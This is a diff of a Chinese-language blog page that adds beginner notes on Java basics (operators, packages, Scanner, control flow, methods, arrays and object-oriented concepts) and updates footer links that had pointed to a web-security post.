+<li>算术运算符：<code>+ , - , * , / , % , ++ , --</code></li>
+<li>赋值运算符：<code>=</code></li>
+<li>关系运算符：<code>&gt; , &lt; , &gt;= , &lt;= , == , != , instanceof</code></li>
+<li>逻辑运算符：<code>&amp;&amp; , || , ! </code></li>
+<li>位运算符：<code>&amp; , | , ^ , ~ , &gt;&gt; , &lt;&lt; , &gt;&gt;&gt;(了解！！)</code></li>
+<li>条件运算符：<code>? :</code></li>
+<li>扩展运算符：<code>+= , -= , *= , /=</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/1001990-20161025144757265-1724289762.png" alt="img"></p>
+<h2 id="包机制"><a href="#包机制" class="headerlink" title="包机制"></a>包机制</h2><ul>
+<li><p>为了更好地组织类，Java提供了包机制，用于区别类名的命名空间</p>
+</li>
+<li><p>包语句的语法格式为：<code>package pkg1[.pkg2.[pkg3]];</code></p>
+</li>
+<li><p>一般利用公司域名倒置作为包名；</p>
+</li>
+<li><p>为了能够使用某一包的成员，我们需要在Java程序中明确导入该包，使用 “import” 语句可以完成此功能</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> package1[.package2...].(classname|*);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="JavaDoc"><a href="#JavaDoc" class="headerlink" title="JavaDoc"></a>JavaDoc</h2><ul>
+<li>javadoc命令是用来生成自己API文档的</li>
+<li>参数信息<ul>
+<li>@author 作者名</li>
+<li>@version 版本号</li>
+<li>@since 知名需要最早使用的jdk版本</li>
+<li>@param 参数名</li>
+<li>@return 返回值类型</li>
+<li>@throws 异常抛出情况</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x02-Java流程控制"><a href="#0x02-Java流程控制" class="headerlink" title="0x02 Java流程控制"></a>0x02 Java流程控制</h1><h2 id="Scanner对象"><a href="#Scanner对象" class="headerlink" title="Scanner对象"></a>Scanner对象</h2><ul>
+<li><p>之前我们学的基本语法中我们并没有实现程序和人的交互，但是Java给我们提供了这样一个工具类，我们可以获取用户的输入，java.util.Scanner 是 Java5 的新特征，我们可以通过 Scanner 类来获取用户的输入</p>
+</li>
+<li><p>基本语法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过 Scanner 类的 next() 与 nextLine() 方法获取输入的字符串，在读取前我们一般需要 使用 hasNext() 与 hasNextLine() 判断是否还有输入的数据。</p>
+</li>
+</ul>
+<h3 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h3><ol>
+<li>一定要读取到有效字符后才可以结束输入</li>
+<li>对输入有效字符之前遇到的空白，next()方法会自动将其去掉</li>
+<li>只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符</li>
+<li>next() 不能得到带有空格的字符串</li>
+</ol>
+<h3 id="nextLine"><a href="#nextLine" class="headerlink" title="nextLine()"></a>nextLine()</h3><ol>
+<li>以Enter为结束符，也就是说 nextLine() 方法返回的是输入回车之前的所有字符</li>
+<li>可以获得空白</li>
+</ol>
+<h2 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h2><p><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220314152105324.png" alt="image-20220314152105324"></p>
+<h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><ul>
+<li>if单选择结构<ul>
+<li><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220314152331996.png" alt="image-20220314152331996"></li>
+<li><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220314152344919.png" alt="image-20220314152344919"></li>
+</ul>
+</li>
+<li>if双选择结构<ul>
+<li><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220314152518849.png" alt="image-20220314152518849"></li>
+<li><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220314152529597.png" alt="image-20220314152529597"></li>
+</ul>
+</li>
+<li>if多选择结构<ul>
+<li><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315141942719.png" alt="image-20220315141942719"></li>
+<li><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315141836008.png" alt="image-20220315141836008"></li>
+</ul>
+</li>
+<li>嵌套的if结构<ul>
+<li><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315142000407.png" alt="image-20220315142000407"></li>
+</ul>
+</li>
+<li>switch多选择结构<ul>
+<li>switch 语句中的变量类型可以是：<ul>
+<li>byte、short、int 或者 char</li>
+<li>从 Java SE7 开始 switch 支持字符串String类型了</li>
+<li>同时 case 标签必须为字符串常量或字面量</li>
+</ul>
+</li>
+<li><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315142221348.png" alt="image-20220315142221348"></li>
+</ul>
+</li>
+</ul>
+<h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><ul>
+<li><p>while循环</p>
+<ul>
+<li><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315143128001.png" alt="image-20220315143128001"></li>
+</ul>
+</li>
+<li><p>do…while循环</p>
+<ul>
+<li><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315143357872.png" alt="image-20220315143357872"></li>
+</ul>
+</li>
+<li><p>for循环</p>
+<ul>
+<li><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315143626521.png" alt="image-20220315143626521"></li>
+</ul>
+</li>
+<li><p>在 Java 5 中引入了一种主要用于数组的增强型 for 循环</p>
+<ul>
+<li><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315144642791.png" alt="image-20220315144642791"></li>
+</ul>
+</li>
+<li><p>break、continue</p>
+<ul>
+<li>break 用于强制退出循环，不执行循环中剩余的语句（break 语句也在 switch 语句中使用）</li>
+<li>continue 语句用在循环语句体中，用于终止某次循环过程，即跳过循环中尚未执行的语句，接着进行下一次循环的判断</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x03-Java方法"><a href="#0x03-Java方法" class="headerlink" title="0x03 Java方法"></a>0x03 Java方法</h1><h2 id="方法定义"><a href="#方法定义" class="headerlink" title="方法定义"></a>方法定义</h2><p>方法包括：修饰符、返回值类型、方法名、参数类型、方法体</p>
+<h2 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h2><p>对象名.方法名(实参列表)</p>
+<h2 id="值传递和引用传递"><a href="#值传递和引用传递" class="headerlink" title="值传递和引用传递"></a>值传递和引用传递</h2><h3 id="String类型传递"><a href="#String类型传递" class="headerlink" title="String类型传递"></a>String类型传递</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;AAA&quot;</span>;</span><br><span class="line"></span><br><span class="line">    change(str);</span><br><span class="line"></span><br><span class="line">    System.out.println(str);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">change</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    s = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行的结果是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAA</span><br></pre></td></tr></table></figure>
+
+<p>String是一个类，类是引用数据类型，做为参数传递的时候，应该是引用传递。但是从结果看起来却是值传递。<br>原因：</p>
+<p>String的API中有这么一句话：“their values cannot be changed after they are created”，<br>意思是：String的值在创建之后不能被更改。<br>API中还有一段：<br>String str &#x3D; “abc”;<br>等效于：<br>char data[] &#x3D; {‘a’, ‘b’, ‘c’};<br>String str &#x3D; new String(data);<br>也就是说：对String对象str的任何修改 等同于 重新创建一个对象，并将新的地址值赋值给str。</p>
+<p>这样的话，上面的代码就可以写成：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;AAA&quot;</span>;</span><br><span class="line"></span><br><span class="line">    change(str1);</span><br><span class="line"></span><br><span class="line">    System.out.println(str1);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">change</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="type">char</span> data[] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(data);</span><br><span class="line">    s = str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="方法的重载"><a href="#方法的重载" class="headerlink" title="方法的重载"></a>方法的重载</h2><ul>
+<li>重载的规则<ul>
+<li>方法名必须相同</li>
+<li>参数列表必须不同（个数不同、或类型不同、参数排列顺序不同等 ）</li>
+<li>方法的返回类型可以相同也可以不相同</li>
+<li>仅仅返回类型不同不足以成为方法的重载</li>
+</ul>
+</li>
+</ul>
+<h2 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h2><ul>
+<li><p>有时候你希望运行一个程序时候再传递给它消息。这要靠命令行参数给main()函数实现</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommandLine</span>()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;args[&quot;</span> + i + <span class="string">&quot;]:&quot;</span> + args[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><ul>
+<li>JDK 1.5 开始，Java 支持传递同类型的可变参数给一个方法。</li>
+<li>在方法声明中，在指定参数类型后加一个省略号(…)。</li>
+<li>一个方法中只能指定一个可变参数，它必须是方法的最后一个参数。任何普通的参数必须在它之前声明。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printMax</span><span class="params">(<span class="type">double</span>... numbers)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(numbers.length == <span class="number">0</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;No argument passed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">double</span> <span class="variable">result</span> <span class="operator">=</span> numbers[<span class="number">0</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 排序</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; numbers.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(numbers[i] &gt; result)</span><br><span class="line">            result = numbers[i];</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;The max value is &quot;</span> + result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x04-数组"><a href="#0x04-数组" class="headerlink" title="0x04 数组"></a>0x04 数组</h1><h2 id="声明数组"><a href="#声明数组" class="headerlink" title="声明数组"></a>声明数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dataType[] arrayRefVar; <span class="comment">// 首选的方法</span></span><br><span class="line">或</span><br><span class="line">dataType arrayReVar[];</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>使用 new 操作符来创建数组</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dataType[] arrayRefVar = <span class="keyword">new</span> <span class="title class_">dataType</span>[arraySize];</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数组索引下标从 0 开始</p>
+</li>
+<li><p>获取数组长度：<code> arrays.length</code></p>
+</li>
+</ul>
+<h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315170923576.png" alt="image-20220315170923576"></p>
+<h2 id="三种初始化"><a href="#三种初始化" class="headerlink" title="三种初始化"></a>三种初始化</h2><ul>
+<li><p>静态初始化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">Man[] mans = &#123;<span class="keyword">new</span> <span class="title class_">Man</span>(<span class="number">1</span>,<span class="number">1</span>), <span class="keyword">new</span> <span class="title class_">Man</span>(<span class="number">2</span>,<span class="number">2</span>)&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>动态初始化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数组的默认初始化</p>
+<ul>
+<li>数组是引用类型，它的元素相当于类的实例变量，因此数组一经分配空间，其中的每个元素也被按照实例变量同样的方法被隐式初始化。</li>
+</ul>
+</li>
+</ul>
+<h2 id="数组的使用"><a href="#数组的使用" class="headerlink" title="数组的使用"></a>数组的使用</h2><ul>
+<li><p>普通的 For 循环</p>
+</li>
+<li><p>For-Each 循环   JDK 1.5后</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">arrays</span> <span class="operator">=</span> &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> array : arrays)&#123;</span><br><span class="line">    System.out.println(array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>数组作方法入参</p>
+</li>
+<li><p>数组作返回值</p>
+</li>
+</ul>
+<h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><ul>
+<li><p>二维数组</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[][] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">5</span>];</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="Arrays-类"><a href="#Arrays-类" class="headerlink" title="Arrays 类"></a>Arrays 类</h2><ul>
+<li><p>数组的工具类 java.util.Arrays</p>
+</li>
+<li><p>具有以下常用功能：</p>
+<ul>
+<li>给数组赋值：通过 fill 方法</li>
+<li>对数组排序：通过 sort 方法</li>
+<li>比较数组：通过 equals 方法比较数组中元素值是否相等</li>
+<li>查找数组元素：通过 binarySearch 方法能对排序好的数组进行二分查找</li>
+</ul>
+</li>
+</ul>
+<h1 id="0x05-面向对象"><a href="#0x05-面向对象" class="headerlink" title="0x05 面向对象"></a>0x05 面向对象</h1><h2 id="什么是面向对象"><a href="#什么是面向对象" class="headerlink" title="什么是面向对象"></a>什么是面向对象</h2><ul>
+<li><p>面向对象编程(Object-Oriented Programming OOP)</p>
+</li>
+<li><p>面向对象编程的本质就是：以类的方式组织代码，以对象的组织（封装）数据。</p>
+</li>
+<li><p>抽象</p>
+</li>
+<li><p>三大特性：</p>
+<ul>
+<li>封装</li>
+<li>继承</li>
+<li>多态</li>
+</ul>
+</li>
+<li><p>从认识角度考虑是先用对象后有类。对象，是具体的事物。类，是抽象的，是对对象的抽象。</p>
+</li>
+<li><p>从代码运行角度考虑是先有类后有对象。类是对象的模板。</p>
+</li>
+</ul>
+<h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><ul>
+<li><p>类中的构造器也称为构造方法，是在进行创建对象的时候必须要调用的。并且构造器有以下两个特点：</p>
+<ul>
+<li>必须和类名同名</li>
+<li>必须没有返回类型，也不能写void</li>
+</ul>
+</li>
+</ul>
 
     
 
@@ -536,7 +783,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="http://example.com/2022/03/08/java内存马01/" title="Tomcat 内存马(一)：Filter型" target="_blank">http://example.com/2022/03/08/java内存马01/</a>
+          <a href="http://example.com/2022/03/13/java基础/" title="java基础" target="_blank">http://example.com/2022/03/13/java基础/</a>
         </li>
         
         <li>
@@ -557,10 +804,6 @@
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web安全</a>
-        		</li>
-      		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
         		</li>
@@ -618,7 +861,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -633,18 +876,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2022/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          从零开始内网渗透学习
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/03/07/IDEA%E5%90%AF%E5%8A%A8tomcat9.0.x/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">IDEA启动Tomcat9.0.x</div>
+    <a href="/2022/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">从零开始内网渗透学习</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -671,7 +905,7 @@
 
 
 
-<div id="SOHUCS" sid="java内存马01" ></div> 
+<div id="SOHUCS" sid="java基础" ></div> 
 <script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
 <script type="text/javascript">
     window.changyan.api.config({
